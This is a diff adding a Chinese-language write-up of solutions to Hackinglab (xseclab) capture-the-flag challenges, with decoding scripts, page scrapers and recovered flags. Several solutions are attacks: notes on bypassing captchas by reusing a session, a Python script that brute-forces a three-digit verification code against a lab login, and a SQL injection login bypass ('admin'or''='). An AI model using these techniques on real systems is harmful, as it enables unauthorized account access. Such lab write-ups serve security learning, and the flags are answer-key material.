@@ -1,3 +1,7 @@
+# Hackinglab
+## 基础关
+### 03猜猜这是经过了多少次加密
+```python
 '''
 多次base64,base32,base16编码
 自动转换明文
@@ -31,3 +35,91 @@ while(1):
         basestring=base64.b16decode(basestring)
         continue
 print ("-"*50+"\nPlain text: "+basestring)
+
+```
+##  脚本关
+### 01.key又又找不到了 
+```python
+import requests
+import re
+url= "http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php"
+url= "http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php"
+
+r =requests.get(url)
+r = re.findall("key is :[ a-z_]{0,32}",r.text)
+print(str(r)[11:-2])
+```
+### 02.快速口算
+```python
+import requests
+import re
+url= "http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php"
+r = requests.session()
+res = r.get(url)
+formula = re.findall("[0-9*+()]{28}",res.text)
+formula = "".join(formula)
+#print(formula)
+ans=eval(formula)
+#print(ans)
+data={'v':ans}
+key = r.post(url,data=data)
+#print(key.text)
+key = re.findall("<body>(.*?)</body>",key.text)
+print(str(key)[9:-5])
+```
+### 04.怎么就是不弹出key呢
+```js
+/*
+本来很简单的一道题 把源码粘贴到console里面就行
+结果因为智商一直翻车
+说是key is first 14 chars
+结果尝试了charsslakfjtes
+还有标题中的dbfmnekepjoapo
+其实结果是slakfjteslkjsd
+*/
+var b=function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1s(1e(p,a,c,k,e,r){e=1e(c){1d(c<a?\'\':e(1p(c/a)))+((c=c%a)>1q?1f.1j(c+1k):c.1n(1o))};1g(!\'\'.1h(/^/,1f)){1i(c--)r[e(c)]=k[c]||e(c);k=[1e(e){1d r[e]}];e=1e(){1d\'\\\\w+\'};c=1};1i(c--)1g(k[c])p=p.1h(1l 1m(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1d p}(\'Y(R(p,a,c,k,e,r){e=R(c){S(c<a?\\\'\\\':e(18(c/a)))+((c=c%a)>17?T.16(c+15):c.12(13))};U(!\\\'\\\'.V(/^/,T)){W(c--)r[e(c)]=k[c]||e(c);k=[R(e){S r[e]}];e=R(){S\\\'\\\\\\\\w+\\\'};c=1};W(c--)U(k[c])p=p.V(Z 11(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);S p}(\\\'G(B(p,a,c,k,e,r){e=B(c){A c.L(a)};E(!\\\\\\\'\\\\\\\'.C(/^/,F)){D(c--)r[e(c)]=k[c]||e(c);k=[B(e){A r[e]}];e=B(){A\\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\\'};c=1};D(c--)E(k[c])p=p.C(I J(\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\'+e(c)+\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\',\\\\\\\'g\\\\\\\'),k[c]);A p}(\\\\\\\'t(h(p,a,c,k,e,r){e=o;n(!\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\'.m(/^/,o)){l(c--)r[c]=k[c]||c;k=[h(e){f r[e]}];e=h(){f\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\'};c=1};l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\'),k[c]);f p}(\\\\\\\\\\\\\\\'1 3="6";1 4="7";1 5="";8(1 2=0;2<9;2++){5+=3+4}\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\'|u|i|b|c|d|v|x|y|j\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\\'),0,{}))\\\\\\\',H,H,\\\\\\\'|||||||||||||||A||B||M||D|C|E|F||I||J|G|N|O||P|Q|K\\\\\\\'.K(\\\\\\\'|\\\\\\\'),0,{}))\\\',X,X,\\\'||||||||||||||||||||||||||||||||||||S|R|V|W|U|T|Y|13|Z|11|14|12|10|19|1a|1b|1c\\\'.14(\\\'|\\\'),0,{}))\',1t,1u,\'|||||||||||||||||||||||||||||||||||||||||||||||||||||1e|1d|1f|1g|1h|1i|1v|1s|1l||1m|1n|1o|1r|1k|1j|1q|1p|1w|1x|1y|1z\'.1r(\'|\'),0,{}))',62,98,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|fromCharCode|29|new|RegExp|toString|36|parseInt|35|split|eval|62|75|53|var|slakfj|teslkjsdflk|for'.split('|'),0,{});
+               var d=eval(b);
+               console.log(d.substr(0,14));
+```
+### 05逗比验证码第一期
+```
+保持住session就行 无脑bp
+LJLJL789sdf#@sd
+```
+### 06逗比验证码第二期
+```
+保持session 验证码验证成功一次后为空
+LJLJL789ss33fasvxcvsdf#@sd
+```
+### 07逗比的验证码第三期（SESSION）
+```python
+完全get不到出题人的点 同06
+LJLJLfuckvcodesdf#@sd
+```
+### 10基情燃烧的岁月
+```python
+import requests
+url = "http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php"
+for i in range(100,999):
+    data={"username":"13388886666","vcode":i,"Login":"submit"}
+    cookies={"PHPSESSID":"33db05b635ed36e8564b1aeb47e06eea"}
+    r = requests.post(url,data=data,cookies=cookies)
+    if(r.text != "vcode or username error"):
+        print(r.text)
+        break
+'''
+164
+你伤心的发现他/她正在跟你的前男/女友勾搭.....于是下决心看看前任除了跟你的（男/女）闺蜜勾搭，是不是还跟别的勾搭..<br>前 任的手机号码是:13399999999
+'''
+
+'''
+还要写获取密码的部分 麻烦的一批 不如用bp来的痛快
+LKK8*(!@@sd
+'''
+```
+## 注入关
+### 
+```
+admin'or''='
+iamflagsafsfskdf11223
+```
